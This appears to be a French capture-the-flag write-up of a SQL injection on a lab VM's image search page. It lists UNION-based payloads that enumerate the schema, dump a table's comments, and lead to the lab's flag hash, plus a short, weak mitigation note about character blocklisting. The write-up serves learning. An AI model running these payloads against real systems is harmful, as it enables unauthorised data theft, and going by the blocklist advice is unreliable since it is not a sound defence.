Résolution:

Pour savoir si une attaque SQL est possible (c'est a dire utiliser des commandes pour chercher des informations dans la base de donné) depuis le front, j'ai utilisé la commende suivante
1 OR 1=1

Ca affiche toutes les images d'un coup a cette adresse:
http://192.168.56.101/index.php?page=searchimg
On remarque une image qui a pour titre "Hack me ?"

Ensuite la commande suivante nous donne le nom de deux bases de données:
1 UNION select 1, database()

Pour avoir le nom de la table contenant les informations qui nous interesse on peut faire la commande suivante:
1 UNION select 1, table_name from Information_schema.tables where table_schema = database()
La table qui nous interesse est "list_image"

Pour avoir le nom des colones de la table "list_image", on peut faire une recherche parmis les résultats de la commande suivante:
1 UNION SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns
On obtient id, url, title et comment.

Si on veut par exemple la colonne comment, on peut utiliser cette commande:
1 UNION SELECT id, comment FROM list_images

on trouve ce message: 
"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
Ce qui décripté donne albatroz. Ce qui donne le flag en sha256

f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188


Il est possible d'escape les caractères spéciciaux comme %20 pour les espaces, pour que le code SQL ne soient plus lisible.
C'est possible aussi d'interdir certains caractères ou bout de code comme ' ou 1=1.
